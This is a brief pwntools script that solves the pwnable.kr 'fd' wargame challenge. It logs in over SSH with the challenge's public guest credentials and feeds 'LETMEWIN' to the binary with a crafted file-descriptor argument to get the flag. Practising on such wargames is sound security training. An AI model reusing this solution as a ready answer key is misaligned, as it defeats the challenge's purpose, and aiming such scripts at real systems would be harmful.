from pwn import *

session = ssh(host='pwnable.kr', user='fd', port=2222, password='guest')
io = session.process('/bin/sh', env={"PS1":""})
io.sendline('echo LETMEWIN | ./fd 4660')
print(io.recvrepeat(1))